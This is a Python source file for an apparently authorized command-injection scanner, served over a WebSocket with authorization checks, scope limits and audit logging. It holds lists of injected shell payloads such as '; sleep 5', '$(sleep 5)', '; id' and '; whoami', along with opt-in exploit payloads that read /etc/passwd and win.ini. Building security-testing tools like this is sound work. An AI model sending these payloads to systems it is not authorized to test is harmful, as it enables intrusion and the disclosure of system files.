"""Command Injection — time-based + output-based detection.

WS  /ws/cmdi
    client -> server:
        {"url":"...FUZZ...", "method","body","headers","cookies",
         "modes":["time","output"], "allow_private":false,
         "rate_per_sec":3, "exploit":false, "confirm_auth":true}

Detection
  - Time-based: send `sleep 5` variants for *nix and `timeout 5` for Windows.
                Compare RTT against baseline.
  - Output-based: send `id` / `whoami` / `hostname` / `uname -a`. Look for
                  uid=, output of whoami (no spaces, alphanumeric line),
                  or `linux`/`darwin` strings.
  - Exploit (opt-in): cat /etc/passwd (Unix) / type C:\\Windows\\win.ini (Windows)
"""
from __future__ import annotations

import asyncio
import logging
import time

from urllib.parse import urlparse

from fastapi import APIRouter, WebSocket, WebSocketDisconnect

from lib import audit_log, scope, web_fuzz
from lib.errors import ErrorCode, MhpError, ws_error
from lib.mode import get_mode
from lib.validators import validate_url

logger = logging.getLogger(__name__)

router = APIRouter(tags=["cmdi"])

# Each row is (label, payload). Sleeps use 5s by default.
TIME_PAYLOADS = [
    ("unix-semicolon",   "; sleep 5"),
    ("unix-and",         "&& sleep 5"),
    ("unix-pipe",        "| sleep 5"),
    ("unix-backtick",    "`sleep 5`"),
    ("unix-dollar",      "$(sleep 5)"),
    ("unix-newline",     "\nsleep 5\n"),
    ("windows-amp",      "& timeout 5"),
    ("windows-and",      "&& ping -n 6 127.0.0.1"),
]

OUTPUT_PAYLOADS = [
    ("unix-id",          "; id"),
    ("unix-whoami",      "; whoami"),
    ("unix-uname",       "; uname -a"),
    ("unix-pipe-id",     "| id"),
    ("windows-whoami",   "& whoami"),
    ("windows-ver",      "& ver"),
]

EXPLOIT_PAYLOADS = [
    ("unix-passwd",      "; cat /etc/passwd"),
    ("unix-pipe-passwd", "| cat /etc/passwd"),
    ("windows-ini",      "& type C:\\Windows\\win.ini"),
]

UID_RE = r"uid=\d+\([^)]+\)"
UNAME_RE = r"(linux|darwin) [\w\-.]+ \d"
PASSWD_RE = r"root:[x*!]:0:0:"
WHOAMI_RE = r"^[a-z_][a-z0-9_\-]{0,30}$"


@router.websocket("/ws/cmdi")
async def cmdi_ws(ws: WebSocket) -> None:
    await ws.accept()
    stop = asyncio.Event()
    audit_id: str | None = None

    async def listen_for_stop() -> None:
        try:
            while True:
                msg = await ws.receive_json()
                if isinstance(msg, dict) and msg.get("action") == "stop":
                    stop.set(); return
        except Exception:
            stop.set()

    try:
        init = await ws.receive_json()
        engagement_id = init.get("engagement_id") or None
        url = str(init.get("url", "")).strip()
        try:
            url = validate_url(url, field="url")
        except MhpError as exc:
            await ws.send_json(ws_error(exc.code, exc.message))
            await ws.close(); return
        tmpl = web_fuzz.FuzzTemplate(
            url=url,
            method=str(init.get("method", "GET")).upper(),
            body=str(init.get("body", "")),
            headers=dict(init.get("headers") or {}),
            cookies=dict(init.get("cookies") or {}),
        )
        if not tmpl.has_marker():
            await ws.send_json(ws_error(
                ErrorCode.BAD_REQUEST,
                f"Place '{web_fuzz.DEFAULT_MARKER}' where payloads go",
            ))
            await ws.close(); return
        if not bool(init.get("confirm_auth", False)):
            await ws.send_json(ws_error(
                ErrorCode.NEED_CONFIRM,
                "Confirm you have authorization to test this target",
            ))
            await ws.close(); return

        confirm = bool(init.get("confirm", False))
        init_mode = str(init.get("mode", "")).strip().lower()
        mode = "engagement" if init_mode == "engagement" else (
            "lab" if init_mode == "lab" else get_mode(ws)
        )
        host_for_scope = urlparse(url).hostname or url
        if not await scope.enforce_ws(ws, host_for_scope, engagement_id, mode, confirm=confirm, active=True, action="cmdi"):
            return

        allow_private = bool(init.get("allow_private", False))
        ok, reason = web_fuzz.check_scope(url, allow_private)
        if not ok:
            await ws.send_json(ws_error(ErrorCode.TARGET_DENIED, reason))
            await ws.close(); return

        modes = list(init.get("modes") or ["time", "output"])
        rate = max(1, min(int(init.get("rate_per_sec", 3)), 15))
        do_exploit = bool(init.get("exploit", False))

        base = await web_fuzz.baseline(tmpl)
        try:
            audit_id = audit_log.start(
                tool="cmdi", target=url,
                argv=[tmpl.method, url, f"modes={','.join(modes)}",
                      f"exploit={do_exploit}", f"rate={rate}/s"],
                engagement_id=engagement_id,
            )
        except Exception:
            logger.exception("audit_log.start failed (scan continues)")

        await ws.send_json({
            "type": "started", "url": url, "modes": modes,
            "baseline": {"status": base.status, "length": base.length,
                         "elapsed_ms": base.elapsed_ms},
            "audit_id": audit_id,
        })

        listener = asyncio.create_task(listen_for_stop())
        t0 = time.monotonic()
        findings = 0

        # ── Time-based ───────────────────────────────────────────────────────
        if "time" in modes:
            for label, p in TIME_PAYLOADS:
                if stop.is_set():
                    break
                r = await web_fuzz.baseline(tmpl, sentinel=p, timeout=12.0)
                await ws.send_json({"type": "attempt", "mode": "time",
                                    "payload": p, "label": label,
                                    "status": r.status, "length": r.length,
                                    "elapsed_ms": r.elapsed_ms})
                if r.elapsed_ms >= 4500 and r.elapsed_ms < 12000 and base.elapsed_ms < 3000:
                    findings += 1
                    await ws.send_json({
                        "type": "finding", "severity": "high", "mode": "time",
                        "payload": p, "label": label,
                        "evidence": f"{r.elapsed_ms} ms vs baseline {base.elapsed_ms} ms",
                        "confirmed": True,
                    })
                    break  # one positive is enough

        # ── Output-based ────────────────────────────────────────────────────
        if "output" in modes and not stop.is_set():
            async def on_out(r: web_fuzz.FuzzResponse) -> None:
                nonlocal findings
                hit = (web_fuzz.regex_first(r.body, [UID_RE, UNAME_RE])
                       or web_fuzz.regex_first(r.body, [r"\bMicrosoft Windows\b"])
                       or (web_fuzz.regex_first(r.body, [WHOAMI_RE])
                           if "whoami" in r.payload and base.length > 0
                           and web_fuzz.length_diff_pct(r.length, base.length) > 1.0
                           else None))
                await ws.send_json({"type": "attempt", "mode": "output",
                                    "payload": r.payload, "status": r.status,
                                    "length": r.length, "elapsed_ms": r.elapsed_ms})
                if hit:
                    findings += 1
                    await ws.send_json({
                        "type": "finding", "severity": "high", "mode": "output",
                        "payload": r.payload, "evidence": hit,
                        "confirmed": True,
                    })
            await web_fuzz.run_payloads(tmpl, [p for _, p in OUTPUT_PAYLOADS],
                                        on_out, concurrency=3,
                                        rate_per_sec=rate, stop=stop)

        # ── Exploit ─────────────────────────────────────────────────────────
        if do_exploit and findings > 0 and not stop.is_set():
            for label, p in EXPLOIT_PAYLOADS:
                if stop.is_set():
                    break
                r = await web_fuzz.baseline(tmpl, sentinel=p, timeout=10.0)
                hit = web_fuzz.regex_first(r.body, [PASSWD_RE, r"\[fonts\]"])
                if hit:
                    findings += 1
                    snippet = r.body[max(0, r.body.find(hit) - 40):
                                     r.body.find(hit) + 400]
                    await ws.send_json({
                        "type": "finding", "severity": "high",
                        "mode": "exploit", "payload": p, "label": label,
                        "evidence": snippet, "confirmed": True,
                    })

        listener.cancel()
        elapsed = round(time.monotonic() - t0, 2)
        await ws.send_json({"type": "done", "elapsed": elapsed,
                            "findings": findings, "stopped": stop.is_set()})
        if audit_id:
            summary = f"{findings} findings, {elapsed}s"
            try:
                if stop.is_set():
                    audit_log.stopped(audit_id, summary=summary)
                else:
                    audit_log.complete(audit_id, summary=summary)
            except Exception:
                logger.exception("audit_log finalize failed")
    except WebSocketDisconnect:
        stop.set()
        if audit_id:
            try: audit_log.stopped(audit_id, summary="client disconnected")
            except Exception: pass
    except Exception as exc:
        logger.exception("cmdi_ws unhandled exception")
        if audit_id:
            try: audit_log.error(audit_id, f"{type(exc).__name__}: {exc}")
            except Exception: pass
        try:
            await ws.send_json(ws_error(
                ErrorCode.INTERNAL,
                "internal error during command-injection scan",
            ))
        except Exception:
            pass
    finally:
        try:
            await ws.close()
        except Exception:
            pass
